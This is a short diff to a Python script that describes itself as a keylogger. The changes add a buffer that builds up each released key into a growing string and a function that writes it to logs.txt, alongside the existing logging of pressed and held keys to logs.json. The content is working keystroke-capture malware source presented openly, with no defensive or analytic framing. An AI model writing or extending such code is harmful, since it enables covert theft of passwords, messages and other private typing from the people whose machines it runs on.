@@ -3,6 +3,11 @@ import json
 
 key_list = []
 x = False #Value to determine if held
+key_strokes = ""
+
+def update_txt_file(key):
+    with open('logs.txt', 'w+') as key_stroke:
+        key_stroke.write(key)
 
 def update_json_file(key_list):
     with open('logs.json', '+wb') as key_log:
@@ -22,7 +27,7 @@ def on_press(key):
             {'Held': f'{key}'}
             #f'Key {key} pressed'
         )
-        update_json_file(key_list)
+    update_json_file(key_list)
 
 def on_release(key):
     global x, key_list, key_strokes
@@ -33,6 +38,8 @@ def on_release(key):
     if x == True:
         x = False
     update_json_file(key_list)
+    key_strokes = key_strokes + str(key)
+    update_txt_file(str(key_strokes))
 
 print("[+] Running Keylogger Successfuly!\n[!] Saving the key logs in 'logs.json'")
 
